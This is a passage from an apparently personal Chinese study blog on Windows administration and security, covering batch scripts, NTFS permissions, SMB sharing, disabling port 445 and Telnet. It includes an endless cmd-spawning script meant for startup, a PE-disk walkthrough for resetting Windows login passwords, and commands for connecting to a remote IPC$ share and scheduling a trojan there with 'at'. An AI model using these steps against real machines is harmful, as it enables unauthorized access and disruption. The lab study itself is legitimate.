c</span><br><span class="line">echo 别乱输入！请重新输入1~3！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:a</span><br><span class="line">set /p time=请输入关机倒计时多少秒：</span><br><span class="line">shutdown -s -f -t %time%</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:b</span><br><span class="line">set /p u=请输入用户名：</span><br><span class="line">set /p p=请输入密码：</span><br><span class="line">net user %u% %p% /add</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:c</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>案例2：死循环打开cmd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:a</span><br><span class="line">start cmd</span><br><span class="line">goto a</span><br></pre></td></tr></table></figure><p>加强版就是加入启动菜单，每次开启都会死循环打开cmd</p><h1 id="PE系统破解windows登录密码"><a href="#PE系统破解windows登录密码" class="headerlink" title="PE系统破解windows登录密码"></a>PE系统破解windows登录密码</h1><p><a href="https://www.bilibili.com/video/BV1eE411K7Rw">U盘PE系统在虚拟机运行教程</a></p><p>PE系统：微型维修系统(相当于缩小版、简化版windows操作系统)</p><p>第一步：准备一个空U盘(记得备份U盘中的数据)</p><p>第二步：准备一个PE系统制作工具(建议最新PE，因为新PE和旧PE可以破解的系统版本不一样，win 10 pe向下兼容，也是最新，所以建议win 10 pe)，插入U盘，并运行PE软件，点击一键安装，此时U盘就变成了PE启动盘</p><p>第三步：将U盘插入到要破解的电脑中，开机，并立即狂按F2或者F1或者esc，进入bios，去修改启动顺序，让电脑开机之后先打开U盘中的PE系统</p><p>第四步：开机，进入PE系统，此时也可以看到一个windows桌面，桌面上一般有一个篡改SAM文件的工具，运行该工具，并打开SAM文件，直接修改密码</p><p>第五步：拔掉U盘，重启电脑</p><hr><h2 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h2><p>例子：</p><p>在虚拟机的windows xp中假装把shimisi用户的密码修改成自己都不记得的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040144739.png" alt="image-20220604014439560"></p><p>然后关机，在windows xp的虚拟机设置中设置CD/DVD，相当于虚拟机使用光盘或者是U盘</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040147748.png" alt="image-20220604014724642"></p><p>设置好之后，VM有个功能就是可以不用按F2或者F1或者esc进入bios</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040148289.png" alt="image-20220604014843201"></p><p>点击之后就可疑进入到bios了，选中CD光盘，然后如果有小键盘直接按<code>+</code>号，如果是退格键左边的+号，需要<code>shift和+</code>号</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040151755.png" alt="image-20220604015127657"></p><p>设置好之后，按右键，就可以到Exit</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040153218.png" alt="image-20220604015315094"></p><p>设置完之后就会重启，来到PE界面，选中第二个选项</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040154144.png" alt="image-20220604015401829"></p><p>然后就会进入到PE系统的主界面，可以看到篡改SAM的软件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040155489.png" alt="image-20220604015522205"></p><p>双击软件快捷方式，然后就会打开这个软件，这个软件会自动检测到SAM文件的路径，点击”打开”按钮，就会查询到所有用户账号</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040156658.png" alt="image-20220604015649494"></p><p>然后点击shimisi–&gt;更改口令，然后设置新密码，点击ok，然后再点击保存更改，就可以成功修改密码了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040158263.png" alt="image-20220604015813179"></p><p>然后把U盘拔掉，就是点击虚拟机设置，然后<strong>把设备状态的两个√去掉</strong>就可以了，下次再用的时候记得再打√</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040159204.png" alt="image-20220604015942098"></p><p>重启之后因为把U盘拔掉了，所以电脑自动运行硬盘中的windows xp系统</p><h2 id="U盘"><a href="#U盘" class="headerlink" title="U盘"></a>U盘</h2><p>如果是U盘的话，添加一个硬盘</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051845691.png" alt="image-20220605184549543"></p><p>然后选择物理磁盘</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051846775.png" alt="image-20220605184605684"></p><p>然后选择U盘添加</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051846649.png" alt="image-20220605184640554"></p><p>添加之后进入电脑固件，把U盘的优先级提高到比硬盘还高</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051848815.png" alt="image-20220605184801672"></p><p>然后F10保存重启就可以进入到PE系统了</p><h1 id="NTFS权限概述"><a href="#NTFS权限概述" class="headerlink" title="NTFS权限概述"></a>NTFS权限概述</h1><p>1、通过设置NTFS权限，实现不同的用户访问不同的权限</p><p>2、分配了正确的访问权限后，用户才能访问其资源</p><p>3、设置权限防止资源被篡改、删除</p><p>常用的文件系统有：</p><ul><li>FAT windows</li><li>NTFS windows</li><li>EXT linux常见</li></ul><p>为什么说<code>NTFS权限</code>，而不是直接说<code>权限</code>呢？我们右键磁盘(文件夹、文件也可以)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060053230.png" alt="image-20220606005326035"></p><p>发现当前磁盘是NTFS，然后右上角有个<code>安全</code>的选项，点击可以看到该磁盘的组权限有哪些是被允许，有哪些是不被允许的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060054979.png" alt="image-20220606005438859"></p><p>而如果磁盘是FAT格式，这是比较老的格式了，不支持对文件或者磁盘的权限进行如此详细的划分，所以一般说权限的话就会说NTFS权限</p><h2 id="NTFS特点"><a href="#NTFS特点" class="headerlink" title="NTFS特点"></a>NTFS特点</h2><ol><li>提高磁盘读写性能</li><li>可靠性、加密文件系统、访问控制列表(设置权限)</li><li>磁盘利用率、压缩、磁盘配额</li><li>支持单个文件大于4个G</li></ol><h2 id="修改NTFS权限"><a href="#修改NTFS权限" class="headerlink" title="修改NTFS权限"></a>修改NTFS权限</h2><p>假设我们有三个用户，然后分别对名叫”jason”的文件夹进行不同的权限分配</p><ul><li>a用户：只可对”jason”文件夹进行读</li><li>b用户：只可对”jason”文件夹进行写</li><li>c用户：可对”jason”文件夹进行读写和修改</li></ul><p>我们在E盘目录下创建”jason”文件夹，然后右键属性–&gt;安全，可以查看权限内容，点击编辑就会显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060114348.png" alt="image-20220606011430230"></p><p>可以看到本来就会给文件夹分配以上的组或者用户，而且无法删除任何一个组或者用户的权限，为什么呢？</p><p>因为E盘相当于”jason”文件夹的父节点，而”jason”是E盘的子节点，它们具有继承关系，E盘的权限组会被”jason”文件夹继承，而我们只想让该文件夹除了管理员以外，进行简单的读写权限分配</p><p>我们可以先把”jason”文件夹和E盘解除关系，否则删除不了其它用户和组</p><p>在安全的选项下点击”高级”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060118025.png" alt="image-20220606011834900"></p><p>然后点击更改权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060119391.png" alt="image-20220606011912302"></p><p>点击然后把框里面的√去掉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060119214.png" alt="image-20220606011942977"></p><p>就会出现如下提示</p><ul><li>添加：和父节点解除关系，还会继承父权限，但是可以删除和添加</li><li>删除：和父节点解除关系，不会继承父权限，但是可以删除和添加</li><li>取消：不想解除关系了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060120894.png" alt="image-20220606012003813"></p><p>这里点击添加或者删除都可以，假如点击了”添加”，回到”jason”文件夹的属性，发现可以对用户和组进行添加和删除了(删到只剩管理员组和75717这个管理员)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060124378.png" alt="image-20220606012449257"></p><p>然后我们添加三个用户：a、b、c (中间加冒号，表示连续查找)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060133683.png" alt="image-20220606013327571"></p><p>然后第一个查找a，发现有多个a开头的用户或者组</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060134230.png" alt="image-20220606013405151"></p><p>照选就可以了，添加完以后点击确定，然后可以在权限组和用户那栏看到已经添加成功，并且可以在下面设置权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060135908.png" alt="image-20220606013519805"></p><p>“列出文件夹内容”权限是必须要的，因为这个权限保证该用户或者组可以进入该文件夹里，其它的话就跟字面上的意思差不多了</p><ul><li>完全控制：所有权限都具有</li><li>修改：增删查改执行，但是没有特殊权限</li><li>读取和执行：可读可执行</li><li>列出文件夹内容：进入文件夹权限</li><li>读取：可读</li><li>写入：可以对文件夹进行写入操作</li></ul><p>在jason验证一下a用户是可读，b用户是可写，c用户是可读可写</p><p>a用户：读取”jason”文件夹下的haha.txt</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060148105.png" alt="image-20220606014811016"></p><p>成功读取，当然了<strong>如果有读取权限，也意味着有下载的权限，就是可以拖动里面的内容到自己的桌面或者属于自己的文件夹内</strong></p><p>如果要添加文件，则会提示输入管理员密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060149864.png" alt="image-20220606014915776"></p><p>如果修改文件内容，也会提示错误</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060149898.png" alt="image-20220606014945795"></p><hr><p>b用户：尝试打开文本内容，提示报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060150886.png" alt="image-20220606015055801"></p><p>如果在里面新建文档也是可以的，但是不可以重命名(<strong>因为这是属于修改的权限，不是写入的权限，不能在该文件夹里修改内容</strong>)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060155091.png" alt="image-20220606015531956"></p><p>而如果在自己的桌面拖动文件到该文件夹里，也是可以的，因为有写入权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060157487.png" alt="image-20220606015718346"></p><p>当然了，因为没有读取权限，所以刚拖进去的文件也是没有权限读取(打开)的</p><p><strong>ps：这里解释一下，刚拖进去的文件因为已经和该文件夹产生了关系，文件已经变成了该文件夹的子节点了，所以b用户对文件夹没有读取权限，而该文件继承了文件夹的权限，所以b用户对该文件也没有读取权限了</strong></p><p>c用户验证了一下没有毛病，可以删可以读可以写，就不写那么多了</p><h2 id="权限累加"><a href="#权限累加" class="headerlink" title="权限累加"></a>权限累加</h2><p>当用户存在于不同的组时，用户的权限是可以累加的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果a用户属于HR组和IT组，HR组可以对jason文件夹进行写入操作，IT组可以对jason文件夹进行读取操作，则a用户最终的权限为读取和写入</span><br></pre></td></tr></table></figure><h2 id="取得所有权"><a href="#取得所有权" class="headerlink" title="取得所有权"></a>取得所有权</h2><p>默认只有administrator有这个权限!</p><p>作用:可以将任何文件夹的所有者改为administrator</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户a已经离职，但xxx文件夹的属主是a，而a用户对xxx文件夹进行过权限修改，除了他自己，任何人甚至管理员都打开不了该文件夹，而管理员administrator用户可以将xxx文件夹重新修改权限</span><br></pre></td></tr></table></figure><p>假如a用户在E盘下创建一个文件夹为<code>comeon</code>，所以他是该文件夹的所有者，然后他解除了跟E盘的关系之后把权限组其他成员包括管理员全部删除了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215593.png" alt="image-20220606021501388"></p><p>然后管理员就没有权限访问该文件夹了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215170.png" alt="image-20220606021534043"></p><p>想要获取永久访问权限点击”继续”也被拒绝允许</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215999.png" alt="image-20220606021542817"></p><p>点击”安全选项卡”，利用管理员的”特殊权限”强制修改所有者为管理员，并且把子文件夹和子文件全部修改所有者权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060218217.png" alt="image-20220606021842062"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219685.png" alt="image-20220606021915598"></p><p>点击”是”，该文件夹及子文件全部的权限都强制修改成管理员了，文件夹下的文件也都可以打开</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219241.png" alt="image-20220606021929142"></p><p>查看一下文件夹属性，发现所有者已经变成了管理员</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219025.png" alt="image-20220606021947891"></p><h2 id="文件复制对权限的影响"><a href="#文件复制对权限的影响" class="headerlink" title="文件复制对权限的影响"></a>文件复制对权限的影响</h2><p>在win 2003/win xp操作系统中，文件复制后，文件的权限会被目标文件夹的权限覆盖，而如果是同分区剪切粘贴的操作，会保留原有的组或用户名权限</p><p>由于NTFS的权限是以分区为单位进行保存的，只有移动到同一分区内才保留原来设置的权限，否则为继承目的地文件夹或者驱动器的NTFS权限(原设定的权限被清除)。</p><p><a href="https://www.jy135.com/diannao/332001.html">详细看这里</a></p><p><a href="https://www.bilibili.com/video/BV1Tb4y1h7uw?p=26">b站讲解</a></p><p>同分区复制  — 覆盖</p><p>同分区移动  — 不变</p><p>不同分区移动  — 覆盖</p><p>不同分区复制  — 覆盖</p><hr><h1 id="文件共享服务-SMB"><a href="#文件共享服务-SMB" class="headerlink" title="文件共享服务(SMB)"></a>文件共享服务(SMB)</h1><h2 id="1-共享服务器概述"><a href="#1-共享服务器概述" class="headerlink" title="1.共享服务器概述"></a>1.共享服务器概述</h2><p>通过网络提供文件共享服务，提供文件下载和上传服务(类似于FTP服务器)，<strong>端口号：445</strong></p><h2 id="2-创建共享"><a href="#2-创建共享" class="headerlink" title="2.创建共享"></a>2.创建共享</h2><p>win 7方法：文件夹右键属性–共享–高级共享–共享此文件夹<br>然后可以设置共享名</p><p><strong>共享权限这里建议不要修改，因为共享权限与安全里的用户或组权限取的是交集，如果a用户共享里的权限比安全里的权限少则取共享的权限为主，一般为了方便都是在共享权限中设置everyone的组时完全控制权限的，这样的话权限就只由安全里的用户或组权限来决定</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061822187.png" alt="image-20220606182156948"></p><p>点击应用然后确定，可以看到网络路径，这个路径是局域网其它主机用来访问该共享文件夹的路径，<strong>这个路径是计算机名+共享文件夹</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061823180.png" alt="image-20220606182316076"></p><p>再点击共享，设置一下a的权限(因为前面说到共享权限和安全权限是交集，如想要读取，则共享权限和安全权限的读取权限都要被允许)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061831578.png" alt="image-20220606183134451"></p><p>但是一般直接设置everyone的组获得全部权限(如下)就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061835692.png" alt="image-20220606183546588"></p><p>然后打开物理机的运行框，输入刚才的路径(使用ip地址也可以，<code>\\192.168.29.140\thejason</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061824076.png" alt="image-20220606182440961"></p><p>输入用户和密码(注意！如果这里没有出现弹框，说明自己的密码和服务器管理员的密码相同！)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061828246.png" alt="image-20220606182825153"></p><p>就可以访问刚才被共享的文件夹了！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061827620.png" alt="image-20220606182700491"></p><p>也可以用该路径配合cmd命令行进行操作。<strong>有上传权限可以把本地文件copy到共享文件夹中，如果有读取权限可以从共享文件夹中下载文件</strong></p><p>下载共享文件夹中的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061841721.png" alt="image-20220606184112603"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061841706.png" alt="image-20220606184139613"></p><p>如果是上传文件，远程路径和本地路径反过来写就行了</p><p>如果想要用其它用户去访问该共享文件夹的话，需要注销该物理机，否则会记住刚才登陆过的账号和密码，就不会显示登陆界面了</p><h2 id="3-创建隐藏共享文件夹"><a href="#3-创建隐藏共享文件夹" class="headerlink" title="3.创建隐藏共享文件夹"></a>3.创建隐藏共享文件夹</h2><p>虽然想要共享文件夹，但是还想要一般人看不到该文件夹，则需要进行隐藏</p><p>右键–&gt;属性，在设置共享名的时候，在后面加入<code>$</code>符，即如果共享名为<code>jason</code>，则设置成<code>jason$</code>，该共享文件夹就可以隐藏起来了</p><p>这个隐藏文件夹在图形界面肯定看不到的，而如果想要访问该隐藏的共享文件夹，需要在路径上加入<code>jason$</code>，即<code>\\ip地址\jason$</code></p><hr><p>创建文件夹，共享名为<code>jason$</code></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062052030.png" alt="image-20220606205218891"></p><p>里面放入文件jm.txt，点击应用并确定后，在物理机查看该虚拟机共享的文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062053472.png" alt="image-20220606205326377"></p><p>没有看到隐藏的共享文件夹，在路径中加入<code>jason$</code></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062054483.png" alt="image-20220606205405380"></p><h2 id="4-net-share"><a href="#4-net-share" class="headerlink" title="4.net share"></a>4.net share</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net share#查看主机已经共享的文件或文件夹</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line"><span class="meta">C$</span><span class="bash">           C:\                             默认共享</span></span><br><span class="line"><span class="meta">E$</span><span class="bash">           E:\                             默认共享</span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash">                                         远程 IPC</span></span><br><span class="line"><span class="meta">jason$</span><span class="bash">       E:\机密</span></span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span></span><br><span class="line">thejason     E:\jason</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到C盘和E盘的根目录\C盘下的windows文件夹都已经被共享了，如果知道该主机的管理员账号和密码以及ip地址，就可以轻松访问磁盘</p><p>如果要删除共享的磁盘，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">net share 共享名 /del</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">比如删除E盘的共享</span></span><br><span class="line">C:\Windows\system32&gt;net share e$ /del</span><br><span class="line"><span class="meta">e$</span><span class="bash"> 已经删除。</span></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"><span class="meta">C$</span><span class="bash">           C:\                             默认共享</span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash">                                         远程 IPC</span></span><br><span class="line"><span class="meta">jason$</span><span class="bash">       E:\机密</span></span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span></span><br><span class="line">thejason     E:\jason</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>但是删除之后，重启就会恢复原来的样子，刚才的命令只是临时起作用，所以这就需要屏蔽系统共享的操作了</p><h2 id="5-屏蔽系统共享"><a href="#5-屏蔽系统共享" class="headerlink" title="5.屏蔽系统共享"></a>5.屏蔽系统共享</h2><ul><li>打开注册表：regedit</li><li>定位共享注册表位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters</code>右键新建REG_ DWORD类型的AutoShareServer键  ,值为0</li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070530780.png" alt="image-20220607053018652"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070531242.png" alt="image-20220607053109104"></p><p>0代表关闭，1代表开启，所以这里意思是以后开启就不要自动开启系统共享了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070531402.png" alt="image-20220607053124144"></p><h2 id="6-关闭445服务"><a href="#6-关闭445服务" class="headerlink" title="6.关闭445服务"></a>6.关闭445服务</h2><p>可以看到<code>IPC$</code>还是对外开放，这是空链接，如果别人知道管理员账号密码，然后连接到该<code>IPC$</code>，即使是空链接，还是可以远程操控电脑的所有操作，比如注册表、磁盘分区等。即使不共享文件夹了，445端口还是默认打开，<code>IPC$</code>还是可以连接</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>打开services.msc,并停止及禁用server服务，即关闭445端口</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071511305.png" alt="image-20220607151115160"></p><p>可以看到启动类型为”自动”，说明开机自启，启动类型选择禁用、然后停止当前进程的话就相当于永久禁用445端口的服务了，下次开机也不会自启了</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>禁止被访问445、配置高级安全防火墙-入站规则（在win7及以上系统、win2008及以上系统）</p><p>打开控制面板–&gt;系统和安全–&gt;Windows 防火墙</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071513375.png" alt="image-20220607151306270"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071641999.png" alt="image-20220607164141837"></p><p>这里解释一下</p><ul><li>入站规则：就是别人访问该主机的时候制定的规则</li><li>出站规则：就是该主机访问别人的时候制定的规则(一般不设置)</li></ul><p>鼠标右键入站规则–&gt;新建规则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071643791.png" alt="image-20220607164348629"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071644981.png" alt="image-20220607164416852"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071644732.png" alt="image-20220607164437618"></p><p>然后”配置文件”这个步骤直接点击下一步，”名称”这个步骤随便填一个可以看出来的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071647240.png" alt="image-20220607164723069"></p><p>点击完成就创建成功了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071647763.png" alt="image-20220607164736634"></p><p><strong>当然，刚刚设置的是TCP连接禁止访问445的，而UDP也要禁止，所以还要再设置一个禁止UDP访问445的规则</strong></p><p>一般要么时tcp，要么时udp，唯独是445需要tcp，udp都需要阻止，</p><p>起的名称好记符合程序员通用命名规则就行</p><h2 id="7-ipc植入木马"><a href="#7-ipc植入木马" class="headerlink" title="7.ipc植入木马"></a>7.ipc植入木马</h2><h3 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h3><p>命令行状态下连接文件共享服务器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip地址\ipc$ 密码 /user:用户名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">当连接成功之后，虽然没有什么反应，但是可以对被攻击的主机进行所有操作，比如访问磁盘，该ipc植入木马的操作相当于先搭了一座桥，然后我们才可以通过卡车运输货物(木马)到对岸(攻击机)</span></span><br><span class="line">C:\WINDOWS\system32&gt;net use \\192.168.29.140\ipc$ 123456 /user:75717</span><br><span class="line">命令成功完成。   #连接成功</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;net time \\192.168.29.140#可以查看到192.168.29.140的时间，说明确实连接成功</span><br><span class="line">\\192.168.29.140 的当前时间是 2022/6/8 5:39:01</span><br><span class="line"></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>一般是按照如下步骤来进行，使用scanport来检查445端口是否开放，NTscan来密码爆破</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206080523999.png" alt="image-20220608052336755"></p><p>然后就是植入木马，可以使用cs来制作木马，然后传到被攻击机的一个磁盘上</p><p>比如说我在cs中创建了一个木马病毒attackwin7.exe</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206082228443.png" alt="image-20220608222858197"></p><p>在Windows10系统会报错，因为微软加强了安全性，取消了空连接。连接时报：“发生系统错误 5。”<a href="https://blog.csdn.net/abraham76/article/details/123868072">ipc漏洞解释1</a>，<a href="https://blog.csdn.net/woswod/article/details/63253426">ipc漏洞解释2</a><br>以前建立空会话可以获取一些有用的信息，后来空会话的权限很低，任何访问都会被拒绝。这个实验暂时跳过…</p><p>然后给被攻击机制作一个时间作业，在某个时间进行一个操作，比如运行该木马</p><h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.29.140 15:26 c:\attackwin7.exe    #在下午15:26分执行任务</span><br><span class="line">at \\192.168.29.140   #查看任务</span><br><span class="line">at \\192.168.29.140 /del   #删除任务</span><br></pre></td></tr></table></figure><h1 id="Telnet服务器远程管理"><a href="#Telnet服务器远程管理" class="headerlink" title="Telnet服务器远程管理"></a>Telnet服务器远程管理</h1><p>如果不想远程桌面管理而是想命令行远程管理的话，telnet也许也是一个不错的选择(windows一般用telnet，linux一般都用ssh)</p><h2 id="1-远程管理类型"><a href="#1-远程管理类型" class="headerlink" title="1.远程管理类型"></a>1.远程管理类型</h2><ul><li>远程桌面(图形)RDP：端口号3389</li><li>telnet(命令行)：端口号23</li></ul><h2 id="2-Telnet远程连接"><a href="#2-Telnet远程连接" class="headerlink" title="2.Telnet远程连接"></a>2.Telnet远程连接</h2><ul><li>首先确保服务器和客户机互通</li><li>win+R运行中打开<strong>services.msc</strong>，找到<strong>Telnet</strong>服务，启动，并且启动类型改成自动启动</li><li><code>netstat -an</code>查看Telnet端口<strong>23</strong>是否打开(注意，23端口是服务器打开的，客户机不用开)</li><li>把想要远程连接的用户添加到<strong>TelnetClients</strong>组</li><li><code>telnet ip地址</code>，输入用户名和密码</li></ul><hr><p>在实际操作中，发现我的win 7没有Telnet服务，这时候</p><p>打开控制面板–&gt;程序和功能–&gt;打开和关闭windows功能–&gt;telnet服务器客户端打钩(只充当服务端只需要打钩telnet服务器)–&gt;确定</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090049131.png" alt="image-20220609004939957"></p><p>打钩之后就可以在services.msc看到Telnet服务了，这个服务是用来被连接的，启动类型修改为自动，点击应用，就可以点击服务状态下面的启动按钮了，再点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090052565.png" alt="image-20220609005236451"></p><p>用<code>netstat -an</code>查看telnet默认端口23是否已经开启，23端口开启说明该主机可以<strong>被连接</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090053439.png" alt="image-20220609005312337"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090055078.png" alt="image-20220609005529942"></p><p>这时候服务端就准备好被连接了</p><hr><p>客户机需要在程序中安装<code>Telnet客户端</code>服务</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090103955.png" alt="image-20220609010333851"></p><p>点击确定，windows会自动安装该服务</p><p><strong>需要注意：这里是win 10，Telnet 服务端不再列入 Windows 10 ，建议是使用远程桌面来代替。所以客户机在services.msc中是看不到telnet服务的，在<code>netstat -an</code>中也看不到23端口，因为telnet服务和23端口是用来被连接的</strong></p><p>win 7服务端的ip地址是192.168.29.140，所以在win 10客户机的cmd中输入<code>telnet 192.168.29.140</code>，然后输入服务端的用户和密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090118167.png" alt="image-20220609011809059"></p><p>注意这里输入密码是不会显示在页面的，这是为了安全~</p><p>用户和密码正确后就可以用命令行对win 7服务器进行操作了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090119535.png" alt="image-20220609011949446"></p><p>在服务端中新建haha.txt</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090121448.png" alt="image-20220609012151336"></p><p>回到win 7桌面，可以看到该文件已经创建</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090122680.png" alt="image-20220609012230577"></p><p>使用<code>exit</code>退出telnet的连接</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090124488.png" alt="image-20220609012406305"></p><h1 id="DHCP部署与安全"><a href="#DHCP部署与安全" class="headerlink" title="DHCP部署与安全"></a>DHCP部署与安全</h1><p>DHCP只有在专门的服务器操作系统(在windows操作系统中，只能使用Server版的，即windows server 